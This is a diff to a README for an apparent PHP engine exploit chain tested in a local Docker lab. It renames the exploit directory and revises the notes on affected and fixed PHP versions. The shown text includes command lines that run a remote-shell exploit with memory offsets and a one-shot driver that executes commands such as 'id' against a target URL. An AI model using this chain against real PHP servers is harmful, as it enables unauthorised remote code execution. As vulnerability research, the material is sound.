@@ -108,7 +108,7 @@ Raw chain (local lab):
 
 ```sh
 SPEC=$(python3 -c "print(','.join(['G:300:0xE2']*16+['X:900']))")
-python3 ../oneshot-8426/pure_shell.py \
+python3 ../oneshot/pure_shell.py \
   --host 127.0.0.1 --port 18129 --path /index.php --outdir ./out \
   --zif 0x3abdc0 --dtor 0x49db50 --a1-progress 1000 \
   --b1-fake-len 0xC8000 --b1-spec "$SPEC" --b1-page-off 0x968 \
@@ -120,7 +120,7 @@ URL-only one-shot (only input is the URL; further lines are commands):
 
 ```sh
 printf 'http://127.0.0.1:18129/index.php\nid\nuname -sr\nexit\n' | \
-  P2S_OUTDIR=$PWD/out python3 ../oneshot-8426/exploit.py
+  P2S_OUTDIR=$PWD/out python3 ../oneshot/exploit.py
 ```
 
 ## Files
@@ -128,11 +128,11 @@ printf 'http://127.0.0.1:18129/index.php\nid\nuname -sr\nexit\n' | \
 - `lab-8329/run.sh` — lab bootstrap (image, single-worker Apache, `/out` mount)
 - `lab-8329/evidence/libphp-sha256.txt` — engine identity (the binary is derived from the recorded image digest and is not committed)
 - `lab-8329/evidence/` — chain logs, calibration logs, proof files
-- `oneshot-8426/exploit.py` — URL-only driver, `PROFILES["8.3"|"8.4"]`, banner selection
-- `oneshot-8426/pure_shell.py` — engine (`--s-mode dtor`, `--dtor-anchor`, `--b1-page-off`)
-- `oneshot-8426/payloads/mk_leak_b.py` — B1 builder (`--page-off` forging)
+- `oneshot/exploit.py` — URL-only driver, `PROFILES["8.3"]`, banner selection
+- `oneshot/pure_shell.py` — engine (`--s-mode dtor`, `--dtor-anchor`, `--b1-page-off`)
+- `oneshot/payloads/mk_leak_b.py` — B1 builder (`--page-off` forging)
 
-Scope: local Docker lab only. The 8.3.36 negative control is in
-`lab-8336/RESULT.md`; 8.2.35 is in `lab-8235/RESULT.md`. The 8.4.27 and
-8.5.12 fixed boundaries are covered by the driver gate but were not tested
-in this repository's labs.
+Scope: local Docker lab only. The last affected 8.3 release is proven in
+`lab-8335/RESULT.md`. The 8.2.35, 8.3.36, 8.4.27, and 8.5.12 fixed
+boundaries are covered by the driver gate; no dedicated fixed-build
+negative-control lab is included in this repository.
